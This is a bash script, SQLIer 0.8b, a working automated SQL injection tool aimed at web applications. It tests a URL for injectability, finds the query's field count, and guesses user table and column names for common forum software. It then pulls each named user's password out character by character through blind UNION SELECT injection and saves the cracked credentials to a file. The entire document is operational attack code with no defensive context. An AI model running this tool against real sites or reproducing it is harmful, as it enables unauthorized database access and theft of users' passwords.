#!/bin/bash

#
# SQLIer - Version 0.8b
#
# Author: Brad Cable
# Email: brad@bcable.net
# License: Modified BSD
# License Details:
# http://bcable.net/license.php
#

tblnms="users,user,members,phpbb_users,vb3_user,ibf_members,bbusers,bbuser,usrs,usr,accounts,account,accnts,accnt,customers,customer"
unflds="username,name,user,user_name,user_username,uname,user_uname,usern,user_usern,un,user_un,usrnm,user_usrnm,usr,usernm,user_usernm,nm,user_nm"
pwflds="password,user_password,pass_hash,hash,pass,user_pass,pword,user_pword,passwd,user_passwd,passw,user_passw,pwrd,user_pwrd,pwd,user_pwd"

# Options Stuff
sleeptime=0
function strip_url(){ echo "$1" | sed -r "s/^([^\?\&\#]*).*?/\1/g"; }
while [ ! -z "$1" ]; do
	case "$1" in
		-c) shift; clearhost="$1"; url=1; break ;;
		-o) shift; outputfile="$1"; shift ;;
		-s) shift; sleeptime="$1"; shift ;;
		-u) shift; usernames="$1"; shift ;;
		-w) shift; wgetopts="$1"; shift ;;
		--help) dousage=1; break ;;
		--table-names) shift; tblnms="$1"; shift ;;
		--user-fields) shift; unflds="$1"; shift ;;
		--pass-fields) shift; pwflds="$1"; shift ;;
		-*) error="Unknown option: $1"; dousage=1; break ;;
		*)
			url="$1"
			surl="`strip_url "$url"`"
			host="`echo "$url" | sed -r "s/^.*?\:\/\///g" | sed -r "s/^([^\/]*).*$/\1/g"`"
			shift
			;;
	esac
done

if [ ! -z "$dousage" ] || [ -z "$url" ]; then
	echo
	echo "SQLIer 0.8b"
	echo "Author: Brad Cable <brad@bcable.net>"
	echo "License: Modified BSD (http://bcable.net/license.php)"
	echo
	echo "Usage: sqlier [OPTIONS] [url]"
	##### ################################################################################
	echo " -c [host]              Clear all exploit information stored for [host]."
	echo " -o [file]              Output cracked passwords to [file]."
	echo " -s [seconds]           Wait [seconds] between page requests."
	echo " -u [usernames]         Usernames that will be brute forced from the database,"
	echo "                        comma separated (Username1,Username2,Username3)."
	echo " -w [options]           Pass [options] to wget."
	echo
	echo "Passing Field Names:"
	echo " --table-names [table_names]   Comma separated list of table names to guess."
	echo " --user-fields [user_fields]   Comma separated list of username fields to guess."
	echo " --pass-fields [pass_fields]   Comma separated list of password fields to guess."
	echo
	[ ! -z "$error" ] && echo "$error" && echo
	exit
fi

function clear_host(){
	temp="`tempfile`"
	cat $HOME/.sqlier/exploits | grep -vE "^$1	" > $temp
	rm $HOME/.sqlier/exploits
	mv $temp $HOME/.sqlier/exploits
}

if [ ! -z "$clearhost" ]; then
	echo -n "Really clear all exploit information for '$clearhost'? "
	read -n 1 choice; echo
	[ "`echo $choice | tr Y y`" = "y" ] && clear_host $clearhost && echo "Done" || echo "Aborted"
	exit
fi

# FUNCTIONS #
function reqcnt(){
	req="`cat $reqfile`"
	let req+=1
	echo "$req" > $reqfile
}

# save to ~/.sqlier/exploits
function save(){
	[ ! -d "$HOME/.sqlier" ] && mkdir "$HOME/.sqlier"
	status_str="`get_status`"
	[ -e "$HOME/.sqlier/exploits" ] && clear_host $host
	echo "$host	$url	$status_str" >> $HOME/.sqlier/exploits
	echo "Saved information to ~/.sqlier/exploits"
}

function quit(){
	reqs="`cat $reqfile`"
	rm $reqfile
	[ -z "$1" ] && save
	echo "Requests Sent: $reqs"
	exit
}

# one liners
function addslashes(){ echo "$1" | sed -r "s/\"/\\\\\"/g"; }
function chr(){ echo "print chr($max)" | python; }
function ord(){ echo -n $1 | od -d | sed -r "s/[ ]+/ /g" | awk "{print \$2}" | grep -v "^$"; }
function b64e(){ str="`addslashes "$1"`"; echo -e "import base64\nprint base64.encodestring(\"\"\"$str\"\"\")" | python | sed -r "s/[\n ]//g"; }
function b64d(){ str="`addslashes "$1"`"; echo -e "import base64\nprint base64.decodestring(\"\"\"$str\"\"\")" | python; }

function get_status(){ enc="`b64e "$commstr:$fieldcnt:$tblnm:$unfld:$pwfld:$wgetopts"`"; echo $enc; }

function sqli(){
	[ ! -z "$sleeptime" ] && [ -z "$2" ] && sleep $sleeptime
	newurl="`echo "$url$1" | sed "s/ /%20/g"`"
	newurl="`addslashes "$newurl"`"
	wgetcmd="wget $wgetopts -q -O /dev/stdout \"$newurl\""
	eval "$wgetcmd"
	reqcnt
}

function sameperc(){
	file1="`tempfile`"
	file2="`tempfile`"
	echo "$1" > $file1
	echo "$2" > $file2
	tot="`cat "$file1" "$file2" | wc -c`"
	diffmnt="`diff "$file1" "$file2" | grep "^[<>]" | sed -r "s/^..(.*)$/\1/g" | wc -c`"
	rm "$file1" "$file2"
	let "sameperc=(($tot-$diffmnt)*100)/$tot"
	echo $sameperc
}

function proximity(){
	comp1="`sameperc "$1" "$success"`"
	comp2="`sameperc "$1" "$null"`"
	comp3="`sameperc "$1" "$fail"`"
	#echo "$comp1" 1>&2
	#echo "$comp2" 1>&2
	#echo "$comp3" 1>&2
	if [ -z "$2" ]; then if [ "$comp1" -ge "$comp3" ] || [ "$comp2" -ge "$comp3" ]; then echo 1; fi;
	else [ "$comp1" -ge "$comp2" ] && echo 1; fi
}

function spaceit(){
	spaces=""
	i=0; while let i+=1 && [ "$i" -le "$1" ]; do spaces+=" "; done
}

function loop_fields(){
	loflds="$1"
	dotbl="$2"
	lofld=""
	prev=0
	i=0; while let i+=1 && [ ! -z "`echo "$loflds" | cut -d ',' -f$i`" ]; do
		lo="`echo "$loflds" | cut -d ',' -f$i`"
		[ -z "$dotbl" ] && usel="`sqli " limit 0 union select $lo$fieldstrn from $tblnm limit 1$comstr"`"\
		|| usel="`sqli " limit 0 union select $fieldstr from $lo limit 1$comstr"`"
		[ "`proximity "$usel"`" ] && lofld="$lo" && break
		let prev=${#lo}
		[ "$lo" = "$loflds" ] && break
	done
	echo "$lofld"
}
# END FUNCTIONS #

reqfile="`tempfile`"
echo 0 > $reqfile

if [ -e "$HOME/.sqlier/exploits" ]; then
	explt="`cat "$HOME/.sqlier/exploits" | grep -E -m 1 "^${host}	"`"
	if [ ! -z "$explt" ]; then
		if [ "$url" = "$surl" ]; then
			echo "Loading from stored info on '$host'..."
			url="`echo "$explt" | cut -f2`"
			surl="`strip_url "$url"`"
		fi
		status_str="`echo "$explt" | cut -f3`"
		dstr="`b64d "$status_str"`"
		commstr="`echo "$dstr" | cut -d ':' -f1`"
		fieldcnt="`echo "$dstr" | cut -d ':' -f2`"
		tblnm="`echo "$dstr" | cut -d ':' -f3`"
		unfld="`echo "$dstr" | cut -d ':' -f4`"
		pwfld="`echo "$dstr" | cut -d ':' -f5`"
		wgetopts="`echo "$dstr" | cut -d ':' -f6`"
		fromsave=1
	fi
fi

echo -n "determining if SQL Injection vulnerable..."
success="`sqli "" 1`"
fail="`sqli "'"`"
[ "$success" = "$fail" ] && fail="`sqli "\\\""`" && [ "$success" = "$fail" ] && echo " no" && quit
echo " yes"
bfail="$fail"

echo -n "determining comments string..."
if [ ! -z "$commstr" ]; then
	comstr=" $commstr"
	null="`sqli " limit 0$comstr"`"
	echo -n " (from save)"
else
	comstr=" /*"; commstr="/*"
	null="`sqli " limit 0$comstr"`"
	[ "$null" = "$fail" ] && comstr=" --" && commstr="--" && null="`sqli " limit 0$comstr"`"\
	&& [ "$null" = "$fail" ] && comstr="" && commstr=""\
	&& null="`sqli " limit 0"`"
fi
echo " \"$commstr\""

echo -n "determining number of fields in query..."
if [ ! -z "$fieldcnt" ]; then echo -n " (from save)"
else
	success="`sqli " order by 1 limit 1$comstr"`"
	fail="`sqli " order by 9999999999999 limit 1$comstr"`"

	# fieldcnt
	max=0; min=1; while [ "`proximity "$maxord"`" ] || [ "$max" = "0" ]; do
		let max+=10
		maxord="`sqli " order by $max limit 1$comstr"`"
	done

	while let c=$max-1 && [ "$c" != "$min" ]; do
		let check=($min+$max)/2
		chk="`sqli " order by $check limit 1$comstr"`"
		[ "`proximity "$chk"`" ] && min="$check" || max="$check"
	done

	fieldcnt="$min"
fi
fieldstr="1"; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstr+=",$i"; let i+=1; done
fieldstrn=""; i=2; while [ "$i" -le "$fieldcnt" ]; do fieldstrn+=",$i"; let i+=1; done
echo " \"$fieldcnt\""

echo -n "determining if UNION SELECT vulnerable..."
usel="`sqli " limit 0 union select $fieldstr limit 1$comstr"`"
[ "`proximity "$usel"`" ] && echo " yes" || (echo " no" && echo "Error: Exploit must be UNION SELECT vulnerable." && quit)

success="$usel"
fail="$bfail"

echo -n "determining users table name..."
[ ! -z "$tblnm" ] && echo -n " (from save)" || tblnm="`loop_fields "$tblnms" 1`"
[ ! -z "$tblnm" ] && echo " \"$tblnm\"" || echo " couldn't guess table name"

if [ ! -z "$tblnm" ]; then

	if [ "${tblnm:${#tblnm}-7:7}" = "members" ]; then
		usel="`sqli " limit 0 union select $fieldstr from ${tblnm}_converge limit 1$comstr"`"
		if [ "`proximity "$usel"`" ]; then
			ibf=1
			unfld="$tblnm.name"
			pwfld="${tblnm}_converge.converge_pass_hash"
		fi
	fi

	echo -n "determining username field name..."
	[ ! -z "$unfld" ] && echo -n " (from save)" || unfld="`loop_fields "$unflds"`"
	[ ! -z "$unfld" ] && echo " \"$unfld\"" || echo " couldn't guess username field"

	echo -n "determining password field name..."
	[ ! -z "$pwfld" ] && echo -n " (from save)" || pwfld="`loop_fields "$pwflds"`"
	[ ! -z "$pwfld" ] && echo " \"$pwfld\"" || echo " couldn't guess password field"
fi

save
if [ -z "$tblnm" ] || [ -z "$unfld" ] || [ -z "$pwfld" ]; then
	echo
	echo -n "Not enough information to complete exploit... need "
	[ -z "$tblnm" ] && need="table name, "
	[ -z "$unfld" ] && need+="username field, "
	[ -z "$pwfld" ] && need+="password field, "
	echo "${need:0:${#need}-2}"
	quit 1
fi
echo
echo "Saved exploit for host, now you can use: sqlier $host -u [USERS]"
[ -z "$usernames" ] && quit 1

echo -n "Starting brute force on given username(s)..."
[ ! -z "$outputfile" ] && echo " storing to file '$outputfile'" || echo
echo
echo

k=0; while let k+=1 && username="`echo "$usernames" | cut -d ',' -f$k`" && [ ! -z "$username" ]; do
	i=1
	userstr="concat("
	while [ "$i" -le "${#username}" ]; do
		userstr+="char("`ord ${username:$i-1:1}`"),"
		let i+=1
	done
	userstr="${userstr:0:${#userstr}-1})"

	if [ "$k" = "1" ]; then
		fail="$bfail"
		success="`sqli " limit 0 union select $fieldstr from $tblnm where $unfld=$userstr limit 1$comstr"`"
		null="`sqli " limit 0 union select $fieldstr from $tblnm limit 0$comstr"`"
	fi

	function inject(){
		passstr="ord(substring($pwfld,$1,1))>$2"
		[ -z "$ibf" ] && usel="`sqli " limit 0 union select $fieldstr from $tblnm where $unfld=$userstr and $passstr limit 1$comstr"`"\
		|| usel="`sqli " limit 0 union select $fieldstr from $tblnm, ${tblnm}_converge where $unfld=$userstr and id=converge_id and $passstr limit 1$comstr"`"
		[ "`proximity "$usel" 1`" ] && echo 1
	}

	charno=1
	wholepass=""
	echo -n "$username:"
	while [ ! -z "`inject $charno 0`" ]; do
		min=0
		max=128
		while let c=$max-1 && [ "$c" != "$min" ]; do
			let check=($max+$min)/2
			[ ! -z "`inject $charno $check`" ] && min="$check" || max="$check"
		done
		chr="`chr $max`"
		echo -n $chr
		wholepass+="$chr"
		let charno+=1
	done
	let passlen=$charno-1
	echo

	[ ! -z "$outputfile" ] && echo "$username:$wholepass" >> $outputfile
	[ "$usernames" = "$username" ] && break
done

echo; quit 1 # this cleans everything up
